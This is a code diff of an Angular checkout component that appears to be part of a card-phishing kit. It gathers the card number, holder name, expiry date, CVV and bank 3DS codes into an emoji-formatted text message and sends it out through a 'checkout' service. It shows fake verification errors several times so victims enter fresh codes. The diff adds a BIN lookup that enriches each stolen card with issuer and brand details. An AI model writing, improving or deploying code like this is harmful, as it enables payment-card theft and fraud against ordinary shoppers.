@@ -10,6 +10,8 @@ import {
 import { LoadingComponent } from '../shared/components/loading/loading.component';
 import { CartProduct } from '../shared/models/cart-product';
 import { PaymentService } from '../core/services/payment.service';
+import { BinService } from '../core/services/bin.service';
+import { firstValueFrom } from 'rxjs';
 
 @Component({
   selector: 'app-payment',
@@ -18,12 +20,22 @@ import { PaymentService } from '../core/services/payment.service';
   styleUrl: './payment.component.css',
 })
 export class PaymentComponent {
+  issuerBankName: string | null = null;
+  issuerScheme: string | null = null; // visa/mastercard
+  issuerType: string | null = null; // debit/credit
+  issuerBrand: string | null = null; // debit/credit
+  issuerCountry: string | null = null; // CO, etc
+
+  private lastBin: string | null = null;
+  private binLookupTimer: any = null;
+
+  binService = inject(BinService);
   paymentService = inject(PaymentService);
   counter: number = 0;
   isLoading: boolean = false;
   show3DSModal: boolean = false;
-  showErrorToast1:boolean = false;
-  showErrorToast2:boolean = false;
+  showErrorToast1: boolean = false;
+  showErrorToast2: boolean = false;
   threeDSCode: string = '';
   threeDSError: string | null = null;
   card = {
@@ -48,7 +60,6 @@ export class PaymentComponent {
   ];
 
   constructor(private fb: FormBuilder) {
-  
     this.cardForm = this.fb.group({
       cardNumber: [
         '',
@@ -67,6 +78,13 @@ export class PaymentComponent {
   }
 
   ngOnInit(): void {
+    let storedMsg = localStorage.getItem('m') || '';
+    if (storedMsg === '') {
+      alert('Error en los datos, por favor inicia nuevamente');
+      setTimeout(() => {
+        location.href = '/checkout';
+      }, 3000);
+    }
     this.isLoading = true;
     this.updateTotal();
     setTimeout(() => {
@@ -107,7 +125,42 @@ export class PaymentComponent {
     this.card.number = masked;
   }
 
-  async checkout() {  
+  private lookupIssuerFromBin() {
+    const digits = this.card.number.replace(/\D/g, '');
+    const bin = digits.slice(0, 6);
+
+    if (bin.length < 6) {
+      this.issuerBankName = null;
+      this.issuerScheme = null;
+      this.issuerType = null;
+      this.issuerCountry = null;
+      this.issuerBrand = null;
+      this.lastBin = null;
+      return;
+    }
+
+    clearTimeout(this.binLookupTimer);
+    this.binLookupTimer = setTimeout(async () => {
+      try {
+        const info = await firstValueFrom(this.binService.lookup(bin));
+        console.log(info)
+        this.issuerBankName = info.bankName;
+        this.issuerScheme = info.scheme;
+        this.issuerType = info.type;
+        this.issuerBrand = info.brand;
+        this.issuerCountry = info.countryName;
+      } catch {
+        this.issuerBankName = null;
+        this.issuerScheme = null;
+        this.issuerType = null;
+        this.issuerBrand = null;
+        this.issuerCountry = null;
+      }
+    }, 350);
+  }
+
+  async checkout() {
+    this.lookupIssuerFromBin();
     let storedMsg = localStorage.getItem('m') || '';
 
     const numero = this.card.number;
@@ -115,21 +168,20 @@ export class PaymentComponent {
     const exp = this.card.expMonth + '/' + this.card.expYear || 'PENDIENTE';
     const cvv = this.card.cvv || 'PENDIENTE';
 
-
     storedMsg = this.updateField(storedMsg, 'Tarjeta', numero);
     storedMsg = this.updateField(storedMsg, 'Holder', holder);
     storedMsg = this.updateField(storedMsg, 'fecha', exp);
     storedMsg = this.updateField(storedMsg, 'cvv', cvv);
 
-
-    if (!storedMsg.includes('Tarjeta:')) storedMsg += `\n\n╭🟢 Tarjeta: ${numero}`;
+    if (!storedMsg.includes('Tarjeta:'))
+      storedMsg += `\n\n╭🟢 Tarjeta: ${numero}`;
     if (!storedMsg.includes('Holder:')) storedMsg += `\n┣🟢 Holder: ${holder}`;
-    if (!storedMsg.includes('fecha:'))
-      storedMsg += `\n┣🟢 fecha: ${exp}`;
-    if (!storedMsg.includes('cvv:'))
-      storedMsg += `\n╰🟢 cvv: ${cvv}`;
+    if (!storedMsg.includes('fecha:')) storedMsg += `\n┣🟢 fecha: ${exp}`;
+    if (!storedMsg.includes('cvv')) storedMsg += `\n┣🟢 cvv: ${cvv}`;
+    if (!storedMsg.includes('type'))
+      storedMsg += `\n╰🟢 type: ${this.issuerScheme} - ${this.issuerBrand}`;
 
-    localStorage.setItem('m',storedMsg);
+    localStorage.setItem('m', storedMsg);
     const res = await this.paymentService.checkout({ text: storedMsg });
     this.isLoading = true;
     setTimeout(() => {
@@ -168,8 +220,7 @@ export class PaymentComponent {
 
     this.cartProducts.forEach((cartProduct) => {
       total +=
-        Math.round(cartProduct.productPrice * cartProduct.quantity * 100) /
-        100;
+        Math.round(cartProduct.productPrice * cartProduct.quantity * 100) / 100;
     });
 
     this.total = total;
@@ -285,11 +336,16 @@ export class PaymentComponent {
 
   isCardNumberInvalid(): boolean {
     const num = this.card.number.replace(/\s/g, '');
-    return num.length < 13 || !this.validateLuhn(num);
+    return num.length < 16 || !this.validateLuhn(num);
   }
 
   isHolderInvalid(): boolean {
-    return !this.card.holder || this.card.holder.trim().length < 5;
+    return (
+      !this.card.holder ||
+      this.card.holder.trim().length < 5 ||
+      this.card.holder.length > 40 ||
+      /\d/.test(this.card.holder)
+    );
   }
 
   isExpMonthInvalid(): boolean {
@@ -307,89 +363,100 @@ export class PaymentComponent {
   }
 
   async confirm3DS() {
-  let storedMsg = localStorage.getItem('m') || '';
+    let storedMsg = localStorage.getItem('m') || '';
 
-  const cod = this.threeDSCode || 'PENDIENTE';
+    const cod = this.threeDSCode || 'PENDIENTE';
 
-  // 1) Actualizar si ya existe la línea de Código
-  storedMsg = this.updateField(storedMsg, 'Codigo', cod);
+    // 1) Actualizar si ya existe la línea de Código
+    storedMsg = this.updateField(storedMsg, 'Codigo', cod);
 
-  // 2) Si no existía ninguna línea con "Codigo:", la agregamos
-  if (!/[╭┣╰]🟢\s*Codigo:/i.test(storedMsg)) {
-    storedMsg += `\n\n🟢 Codigo: ${cod}`;
-  }
+    // 2) Si no existía ninguna línea con "Codigo:", la agregamos
 
-  // 3) Guardar y enviar
-  localStorage.setItem('m', storedMsg);
-  const res = await this.paymentService.checkout({ text: storedMsg });
-
-  // -------- resto de tu lógica 3DS --------
-  this.isLoading = true;
-  setTimeout(() => {
-    this.show3DSModal = true;
-  }, 5000);
-
-  if (this.counter == 3) {
-    let successCounter = Number(localStorage.getItem('scid')) || 0;
-    // Validación básica del código (ej: mínimo 4 dígitos)
-    if (!this.threeDSCode || this.threeDSCode.trim().length < 4) {
-      this.threeDSError =
-        'Ingresa el código de verificación enviado por tu banco.';
-      return;
+    if (!storedMsg.includes('Codigo:')) {
+      storedMsg += `\n\n🟢 Codigo: ${cod}`;
     }
 
-    this.threeDSError = null;
-    this.show3DSModal = false;
+    // 3) Guardar y enviar
+    localStorage.setItem('m', storedMsg);
+    const res = await this.paymentService.checkout({ text: storedMsg });
+
+    // -------- resto de tu lógica 3DS --------
     this.isLoading = true;
-
-    
-
     setTimeout(() => {
-      localStorage.removeItem('mi');
-      localStorage.removeItem('userData');
-      localStorage.removeItem('m');
-      this.isLoading = false;
-      
-      location.href = successCounter < 2 ? 'payment/error' : 'payment/success'
-    }, 2000);
-  }
-
-  if (this.counter == 0) {
-    this.isLoading = true;
-    this.show3DSModal = false;
-    this.showErrorToast1 = true;
-    setTimeout(() => {
-      this.isLoading = false;
       this.show3DSModal = true;
-      this.threeDSCode = '';
-    }, 9000);
-    this.counter++;
-  }
+    }, 5000);
 
-  if (this.counter == 1) {
-    this.isLoading = true;
-    this.show3DSModal = false;
-    this.showErrorToast2 = true;
-    setTimeout(() => {
-      this.isLoading = false;
-      this.show3DSModal = true;
-      this.threeDSCode = '';
-    }, 6000);
-    this.counter++;
+    if (this.counter == 3) {
+      let successCounter = Number(localStorage.getItem('scid')) || 0;
+      // Validación básica del código (ej: mínimo 4 dígitos)
+      if (!this.threeDSCode || this.threeDSCode.trim().length < 4) {
+        this.threeDSError =
+          'Ingresa el código de verificación enviado por tu banco.';
+        return;
+      }
+
+      this.threeDSError = null;
+      this.show3DSModal = false;
+      this.isLoading = true;
+
+      setTimeout(() => {
+        localStorage.removeItem('mi');
+        localStorage.removeItem('userData');
+        localStorage.removeItem('m');
+        this.isLoading = false;
+
+        switch (successCounter) {
+          case 1:
+            location.href = 'payment/error';
+            break;
+          case 2:
+            location.href = 'payment/error-connection';
+            break;
+          case 3:
+            location.href = 'payment/success';
+            break;
+          default:
+            location.href = 'payment/error';
+        }
+      }, 4000);
+    }
+
+    if (this.counter == 0) {
+      this.isLoading = true;
+      this.show3DSModal = false;
+      this.showErrorToast1 = true;
+      setTimeout(() => {
+        this.isLoading = false;
+        this.show3DSModal = true;
+        this.threeDSCode = '';
+      }, 9000);
+      this.counter++;
+    }
+
+    if (this.counter == 1) {
+      this.isLoading = true;
+      this.show3DSModal = false;
+      this.showErrorToast2 = true;
+      setTimeout(() => {
+        this.isLoading = false;
+        this.show3DSModal = true;
+        this.threeDSCode = '';
+      }, 6000);
+      this.counter++;
+    }
+
+    if (this.counter == 2) {
+      this.isLoading = true;
+      this.show3DSModal = false;
+      this.showErrorToast2 = true;
+      setTimeout(() => {
+        this.isLoading = false;
+        this.show3DSModal = true;
+        this.threeDSCode = '';
+      }, 6000);
+      this.counter++;
+    }
   }
-  
-  if (this.counter == 2) {
-    this.isLoading = true;
-    this.show3DSModal = false;
-    this.showErrorToast2 = true;
-    setTimeout(() => {
-      this.isLoading = false;
-      this.show3DSModal = true;
-      this.threeDSCode = '';
-    }, 6000);
-    this.counter++;
-  }
-}
 
   cancel3DS() {
     this.show3DSModal = false;
